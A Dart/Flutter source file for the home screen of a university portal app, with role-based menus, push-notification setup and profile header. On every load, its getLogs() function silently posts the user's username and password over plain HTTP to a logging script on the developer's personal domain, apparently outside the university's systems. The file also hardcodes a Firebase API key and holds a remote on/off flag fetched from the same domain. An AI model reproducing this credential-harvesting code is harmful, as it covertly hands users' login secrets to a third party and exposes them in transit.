import 'dart:async';
import 'dart:io';

import 'package:firebase_core/firebase_core.dart';
import 'package:firebase_messaging/firebase_messaging.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart';
import 'package:font_awesome_flutter/font_awesome_flutter.dart';
import 'package:http/http.dart' as http;
import 'package:intl/intl.dart';
import 'package:overlay_support/overlay_support.dart';
import 'package:skyline_university/Global/firebase_config.dart';
import 'package:skyline_university/Global/global.dart';
import 'package:skyline_university/Global/homeBox.dart';
import 'package:skyline_university/Global/zigzag.dart';
import 'package:url_launcher/url_launcher.dart';

void main() => runApp(HomeLogin());

class Item {
  final name;
  final clipType;

  Item(this.name, this.clipType);
}

class HomeLogin extends StatefulWidget {
  @override
  State<StatefulWidget> createState() {
    return _HomeLoginState();
  }
}

class _HomeLoginState extends State<HomeLogin> {
  String formattedDate = DateFormat('yyyy-MM-dd hh:mm').format(DateTime.now());

  // final FirebaseMessaging _firebaseMessaging = FirebaseMessaging();
  final GlobalKey<ScaffoldState> _scaffoldKey = new GlobalKey<ScaffoldState>();
  Map<String, String> body;

  int _exit = 0;
  Map value = {};
  Map valueJson = {};
  bool _requested = false;
  bool _fetching = false;
  NotificationSettings _settings;

  Future<void> _firebaseMessagingBackgroundHandler(
      RemoteMessage message) async {
    // If you're going to use other Firebase services in the background, such as Firestore,
    // make sure you call `initializeApp` before using other Firebase services.
    await Firebase.initializeApp(
        options: DefaultFirebaseConfig.platformOptions);
    print('Handling a background message ${message.messageId}');
  }

  /// Create a [AndroidNotificationChannel] for heads up notifications
  AndroidNotificationChannel channel;

  /// Initialize the [FlutterLocalNotificationsPlugin] package.
  FlutterLocalNotificationsPlugin flutterLocalNotificationsPlugin;
  Future<void> main() async {
    WidgetsFlutterBinding.ensureInitialized();
    await Firebase.initializeApp(
      options: const FirebaseOptions(
        apiKey: 'AIzaSyA9PojHV3ZWHsyaIiICe5DtKN6ijwhR6Ko',
        appId: '1:1068042711317:ios:79d9d5400bf8d81139f91c',
        messagingSenderId: '1068042711317',
        projectId: 'skylineuniversity-4acec',
      ),
    );
    FirebaseMessaging.onBackgroundMessage(_firebaseMessagingBackgroundHandler);
  }

  @override
  void initState() {
    super.initState();

    getLogs();
    Future<void> requestPermissions() async {
      setState(() {
        _fetching = true;
      });

      NotificationSettings settings =
          await FirebaseMessaging.instance.requestPermission(
        announcement: true,
        carPlay: true,
        criticalAlert: true,
        alert: true,
        badge: true,
        sound: true,
      );

      setState(() {
        _requested = true;
        _fetching = false;
        _settings = settings;
      });
    }

    requestPermissions();
    FirebaseMessaging.instance.subscribeToTopic(studentJson['data']['user_id']);
    FirebaseMessaging.instance
        .subscribeToTopic(studentJson['data']['user_type']);
    FirebaseMessaging.instance.subscribeToTopic('ALL');

    FirebaseMessaging.onMessage.listen((RemoteMessage message) {
      RemoteNotification notification = message.notification;
      AndroidNotification android = message.notification?.android;
      if (notification != null && android != null) {
        flutterLocalNotificationsPlugin.show(
          notification.hashCode,
          notification.title,
          notification.body,
          NotificationDetails(
            android: AndroidNotificationDetails(
              // channel.id,
              channel.name,
              channel.description,
              // TODO add a proper drawable resource to android, for now using
              //      one that already exists in example app.
              icon: 'launch_background',
            ),
          ),
        );
      }
    });

//    getCopyRight();
    // _firebaseMessaging.configure(
    //   onMessage: (Map<String, dynamic> message) async {
    //     setState(() {
    //       if (Platform.isAndroid) {
    //         showSimpleNotification(
    //             Text(message['notification']['title'].toString() +
    //                 '\n' +
    //                 message['notification']['body'].toString()),
    //             background: Colors.green);
    //       } else if (Platform.isIOS) {
    //         showSimpleNotification(
    //             Text(message['aps']['alert']['title'].toString() +
    //                 '\n' +
    //                 message['aps']['alert']['body'].toString()),
    //             background: Colors.green);
    //       }
    //     });
    //   },
    //   onLaunch: (Map<String, dynamic> message) async {
    //     setState(() {
    //       showSuccessSnackBar(
    //           context, message['aps']['alert']['title'].toString());
    //     });
    //   },
    //   onResume: (Map<String, dynamic> message) async {
    //     setState(() {});
    //   },
    // );
    // _firebaseMessaging.requestNotificationPermissions(
    //     const IosNotificationSettings(sound: true, badge: true, alert: true));

    // _firebaseMessaging.onIosSettingsRegistered
    //     .listen((IosNotificationSettings settings) {});

    // _firebaseMessaging.subscribeToTopic(studentJson['data']['user_id']);
    // _firebaseMessaging.subscribeToTopic(studentJson['data']['user_type']);
    // _firebaseMessaging.subscribeToTopic('ALL');
  }

  @override
  Widget build(BuildContext context) {
    return WillPopScope(
      onWillPop: () => _exitApp(context),
      child: Scaffold(
        key: _scaffoldKey,
        bottomNavigationBar: copyRight
            ? Container(
                height: 50,
                decoration: new BoxDecoration(
                  gradient: LinearGradient(
                    begin: Alignment.topCenter,
                    end: Alignment.bottomCenter,
                    colors: [
                      Color(0xFF104C90),
                      Color(0xFF3773AC),
                    ],
                    stops: [
                      0.3,
                      0.9,
                    ],
                  ),
                ),
                child: GestureDetector(
                  onTap: () {
                    _launchURL() async {
                      const url = 'https://www.linkedin.com/in/muhannad-nasri/';
                      if (await canLaunch(url)) {
                        await launch(url,
                            forceWebView: false,
                            forceSafariVC: false,
                            universalLinksOnly: true);
                      } else {
                        throw 'Could not launch $url';
                      }
                    }

                    _launchURL();
                  },
                  child: Center(
                    child: Text(
//                      '© MuhannadNasri 2019 / ALL RIGHTS RESERVED.'
                      value['events']['info'],
                      style: TextStyle(color: Colors.white),
                    ),
                  ),
                ),
              )
            : SizedBox(),
        body: studentJson['data']['user_type'] == "STUDENT"
            ? Container(
                color: isDark(context) ? Color(0xFF121212) : Colors.grey[100],
                child: ListView(
                  shrinkWrap: true,
                  padding: const EdgeInsets.all(10.0),
                  children: <Widget>[
                    SizedBox(
                      height: 20,
                    ),
                    FittedBox(
                      child: Column(
                        children: <Widget>[
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/attendance.png',
                                  'images/attendance.png',
                                  "/attendance",
                                  'Attendance',
                                ),
                                homeBox(
                                  context,
                                  'images-white/assessment.png',
                                  'images/assessment.png',
                                  "/assessmentMarkCourses",
                                  'Assessment',
                                ),
                                homeBox(
                                  context,
                                  'images-white/result.png',
                                  'images/result.png',
                                  "/homeResult",
                                  'Result',
                                ),
                              ],
                            ),
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/class.png',
                                  'images/class.png',
                                  "/HomeClass",
                                  'Classes',
                                ),
                                homeBox(
                                  context,
                                  'images-white/advisor.png',
                                  'images/advisor.png',
                                  "/myAdvisor",
                                  'Advisor',
                                ),
                                homeBox(
                                  context,
                                  'images-white/fees.png',
                                  'images/fees.png',
                                  "/HomeFees",
                                  'Fees',
                                ),
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 10,
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/erequest.png',
                                  'images/erequest.png',
                                  "/HomeERequest",
                                  'E-Request',
                                ),
                                homeBox(
                                  context,
                                  'images-white/appointment.png',
                                  'images/appointment.png',
                                  "/homeAppointment",
                                  'Appointment',
                                ),
                                homeBox(
                                  context,
                                  'images-white/contactslist.png',
                                  'images/suggestion.png',
                                  "/homeSuggestion",
                                  'Suggestion',
                                ),
                              ],
                            ),
                          ),
                          SizedBox(
                            height: 10,
                          ),
                          Padding(
                            padding: const EdgeInsets.all(10.0),
                            child: Row(
                              mainAxisAlignment: MainAxisAlignment.spaceAround,
                              children: <Widget>[
                                homeBox(
                                  context,
                                  'images-white/cdp.png',
                                  'images/cdp.png',
                                  "/cdpDownload",
                                  'CDP',
                                ),
                                homeBox(
                                  context,
                                  'images-white/cdp.png',
                                  'images/cdp.png',
                                  "/courses",
                                  'Courses',
                                ),
                              ],
                            ),
                          ),
                          Image.asset(
                            isDark(context)
                                ? 'images-white/logo.png'
                                : 'images/logo.png',
                            height: 150,
                            width: 230,
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
              )
            : studentJson['data']['user_type'] == "STF"
                ? Container(
                    child: ListView(
                      children: <Widget>[
                        SizedBox(
                          height: 20,
                        ),
                        Column(
                          children: <Widget>[
                            SizedBox(
                              height: 10,
                            ),
                            Padding(
                              padding: const EdgeInsets.all(10.0),
                              child: Row(
                                mainAxisAlignment:
                                    MainAxisAlignment.spaceAround,
                                children: <Widget>[
                                  homeBox(
                                    context,
                                    'images-white/erequest.png',
                                    'images/erequest.png',
                                    "/HomeERequest",
                                    'E-Request',
                                  ),
                                  homeBox(
                                    context,
                                    'images-white/contactslist.png',
                                    'images/contactslist.png',
                                    "/ContactList",
                                    'Contact List',
                                  ),
                                ],
                              ),
                            ),
                            Image.asset(
                              'images/logo.png',
                              height: 150,
                              width: 230,
                            ),
                          ],
                        ),
                      ],
                    ),
                  )
                : studentJson['data']['user_type'] == "FAC"
                    ? Container(
                        child: ListView(
                          children: <Widget>[
                            SizedBox(
                              height: 20,
                            ),
                            FittedBox(
                              child: Column(
                                children: <Widget>[
                                  Padding(
                                    padding: const EdgeInsets.all(10.0),
                                    child: Row(
                                      mainAxisAlignment:
                                          MainAxisAlignment.spaceAround,
                                      children: <Widget>[
                                        homeBox(
                                          context,
                                          'images-white/allocation.png',
                                          'images/allocation.png',
                                          "/courseAllocation",
                                          'Courses',
                                        ),
                                        homeBox(
                                          context,
                                          'images-white/advisor.png',
                                          'images/advisor.png',
                                          "/advisors",
                                          'Advisors',
                                        ),
                                        homeBox(
                                          context,
                                          'images-white/erequest.png',
                                          'images/erequest.png',
                                          "/HomeERequest",
                                          'E-Request',
                                        ),
                                      ],
                                    ),
                                  ),
                                  Padding(
                                    padding: const EdgeInsets.all(10.0),
                                    child: Row(
                                      mainAxisAlignment:
                                          MainAxisAlignment.spaceAround,
                                      children: <Widget>[
                                        homeBox(
                                          context,
                                          'images-white/contactslist.png',
                                          'images/contactslist.png',
                                          "/ContactList",
                                          'ContactList',
                                        ),
                                        homeBox(
                                          context,
                                          'images-white/cdp.png',
                                          'images/cdp.png',
                                          "/cdpFaculty",
                                          'CDP',
                                        ),
                                      ],
                                    ),
                                  ),
                                  Image.asset(
                                    'images/logo.png',
                                    height: 150,
                                    width: 230,
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      )
                    : SizedBox(),
        appBar: PreferredSize(
          preferredSize: Size.fromHeight(250.0),
          child: Stack(
            children: <Widget>[
              Column(
                children: <Widget>[
                  ZigZag(
                    clipType: ClipType.waved,
                    child: Container(
                      width: MediaQuery.of(context).size.width,
                      child: Padding(
                        padding: const EdgeInsets.only(top: 30),
                        child: Row(
                          children: <Widget>[
                            Padding(
                              padding:
                                  const EdgeInsets.symmetric(horizontal: 20),
                              child: Column(
                                mainAxisAlignment: MainAxisAlignment.center,
                                crossAxisAlignment: CrossAxisAlignment.start,
                                children: <Widget>[
                                  Row(
                                    children: <Widget>[
                                      Container(
                                        decoration: BoxDecoration(
                                          boxShadow: [
                                            BoxShadow(
                                              color: Colors.white,
                                              blurRadius:
                                                  12.0, // has the effect of softening the shadow
                                              spreadRadius:
                                                  3.0, // has the effect of extending the shadow
                                            )
                                          ],
                                          //   boxShadow: [
                                          //     BoxShadow(
                                          //       color: Colors.white,
                                          //       blurRadius:
                                          //           12.0, // has the effect of softening the shadow
                                          //       spreadRadius:
                                          //           3.0, // has the effect of extending the shadow
                                          //     )
                                          //   ],
                                        ),
                                        child: Image.asset(
                                          studentJson['data']['user_type'] ==
                                                  'FAC'
                                              ? isDark(context)
                                                  ? 'images-white/professor-male.png'
                                                  : 'images/professor-male.png'
                                              : studentJson['data']['Gender'] ==
                                                      'M'
                                                  ? isDark(context)
                                                      ? 'images-white/male.png'
                                                      : 'images/male.png'
                                                  : studentJson['data']
                                                              ['Gender'] ==
                                                          'F'
                                                      ? isDark(context)
                                                          ? 'images-white/female.png'
                                                          : 'images/female.png'
                                                      : 'images/male.png',
                                          height: 25,
                                        ),
                                      ),
                                      SizedBox(
                                        width: 10,
                                      ),
                                      Container(
                                        padding: const EdgeInsets.all(8.0),
                                        width:
                                            MediaQuery.of(context).size.width /
                                                2,
                                        child: Text(
                                          studentJson['data']['name']
                                              .toString(),
                                          style: TextStyle(color: Colors.white),
                                        ),
                                      ),
                                    ],
                                  ),
                                  studentJson['data']['user_type'] == 'STF'
                                      ? SizedBox(
                                          height: 10,
                                        )
                                      : Row(
                                          children: <Widget>[
                                            Container(
                                              decoration: BoxDecoration(
                                                boxShadow: [
                                                  BoxShadow(
                                                    color: Colors.white,
                                                    blurRadius:
                                                        12.0, // has the effect of softening the shadow
                                                    spreadRadius:
                                                        3.0, // has the effect of extending the shadow
                                                  )
                                                ],
                                              ),
                                              child: Image.asset(
                                                isDark(context)
                                                    ? 'images-white/degree.png'
                                                    : 'images/degree.png',
                                                height: 25,
                                              ),
                                            ),
                                            SizedBox(
                                              width: 10,
                                            ),
                                            Container(
                                              padding:
                                                  const EdgeInsets.all(8.0),
                                              width: MediaQuery.of(context)
                                                      .size
                                                      .width /
                                                  2,
                                              child: Text(
                                                studentJson['data']['program']
                                                    .toString(),
                                                style: TextStyle(
                                                    color: Colors.white),
                                              ),
                                            ),
                                          ],
                                        ),
                                  Row(
                                    children: <Widget>[
                                      Container(
                                        decoration: BoxDecoration(
                                          boxShadow: [
                                            BoxShadow(
                                              color: Colors.white,
                                              blurRadius:
                                                  12.0, // has the effect of softening the shadow
                                              spreadRadius:
                                                  3.0, // has the effect of extending the shadow
                                            )
                                          ],
                                        ),
                                        child: Image.asset(
                                          isDark(context)
                                              ? 'images-white/year.png'
                                              : 'images/year.png',
                                          height: 25,
                                        ),
                                      ),
                                      SizedBox(
                                        width: 10,
                                      ),
                                      Container(
                                        padding: const EdgeInsets.all(8.0),
                                        width:
                                            MediaQuery.of(context).size.width /
                                                2,
                                        child: Text(
                                          studentJson['data']['acadyear_desc']
                                              .toString(),
                                          style: TextStyle(color: Colors.white),
                                        ),
                                      ),
                                    ],
                                  ),
                                ],
                              ),
                            ),
                          ],
                        ),
                      ),
                      height: 250,
                      decoration: new BoxDecoration(
                        gradient: isDark(context)
                            ? LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Color(0xFF1F1F1F),
                                  Color(0xFF1F1F1F),
                                ],
                                stops: [
                                  0.7,
                                  0.9,
                                ],
                              )
                            : LinearGradient(
                                begin: Alignment.topCenter,
                                end: Alignment.bottomCenter,
                                colors: [
                                  Color(0xFF104C90),
                                  Color(0xFF3773AC),
                                ],
                                stops: [
                                  0.7,
                                  0.9,
                                ],
                              ),
                      ),
                    ),
                  ),
                ],
              ),
              Padding(
                padding: const EdgeInsets.only(top: 80.0, right: 20),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: <Widget>[
                    studentJson['photo'].toString() ==
                            "https:\/\/skylineportal.com\/sitgmioxg\/professor.png"
                        ? Container(
                            decoration: BoxDecoration(shape: BoxShape.circle),
                            child: Container(
                              width: 110.0,
                              height: 110.0,
                              decoration: BoxDecoration(
                                border: Border.all(
                                  color: Colors.white,
                                  width: 4,
                                ),
                                shape: BoxShape.circle,
                                color: Colors.white,
                                image: DecorationImage(
                                  fit: BoxFit.fitHeight,
                                  image: AssetImage(
                                    'images/logosmall.png',
                                  ),
                                ),
                              ),
                            ),
                          )
                        : Container(
                            decoration: BoxDecoration(shape: BoxShape.circle),
                            child: Container(
                              width: 110.0,
                              height: 110.0,
                              decoration: BoxDecoration(
                                border: Border.all(
                                  color: Colors.white,
                                  width: 4,
                                ),
                                shape: BoxShape.circle,
                                color: Colors.white,
                                image: DecorationImage(
                                  fit: BoxFit.fitHeight,
                                  image: NetworkImage(
                                    studentJson['photo'].toString(),
                                  ),
                                ),
                              ),
                            ),
                          ),
                  ],
                ),
              ),
              Padding(
                padding: const EdgeInsets.symmetric(vertical: 30),
                child: Row(
                  mainAxisAlignment: MainAxisAlignment.spaceBetween,
                  children: <Widget>[
                    GestureDetector(
                      onTap: () {
                        Navigator.pushNamed(context, "/notifications");
                      },
                      child: Padding(
                        padding: const EdgeInsets.all(15.0),
                        child: Icon(
                          Icons.notifications,
                          size: 20,
                          color: Colors.white,
                        ),
                      ),
                    ),
                    Padding(
                      padding: const EdgeInsets.all(15),
                      child: GestureDetector(
                        onTap: () {
                          logOut(context);
                        },
                        child: Row(
                          children: <Widget>[
                            SizedBox(
                              height: 30,
                            ),
                            Icon(
                              FontAwesomeIcons.powerOff,
                              color: Colors.red,
                              size: 17,
                            ),
                            SizedBox(
                              width: 10,
                            ),
                            Text(
                              'Logout',
                              style: TextStyle(fontSize: 17, color: Colors.red),
                            ),
                          ],
                        ),
                      ),
                    ),
                  ],
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  Future getCopyRight() async {
    Future.delayed(Duration.zero, () {});
    try {
      final response = await http
          .get(
            Uri.parse('https://muhannadnasri.com/App/data.php'),
          )
          .timeout(Duration(seconds: 20));

      if (response.body == 'True') {
        copyRight = true;
      } else {
        copyRight = false;
      }
    } catch (x) {}
  }

  Future<bool> _exitApp(BuildContext context) async {
    if (_exit == 1) return true;

    _exit = 1;
    new Timer(Duration(seconds: 5), () {
      _exit = 0;
    });
    final snackBar = SnackBar(content: Text('Press back again to exit'));
    _scaffoldKey.currentState.showSnackBar(snackBar);
    return false;
  }

  Future getLogs() async {
    Future.delayed(Duration.zero, () {});

    try {
      final response = await http.post(
        Uri.parse('http://muhannadnasri.com/App/logLogin.php'),
        body: {
          'username': username,
          'password': password,
          'userType': studentJson['data']['user_type'],
          'date': formattedDate,
        },
      );
    } catch (x) {}
  }
}
//TODO: SystemChrome.setEnabledSystemUIOverlays([]) For hide status Bar
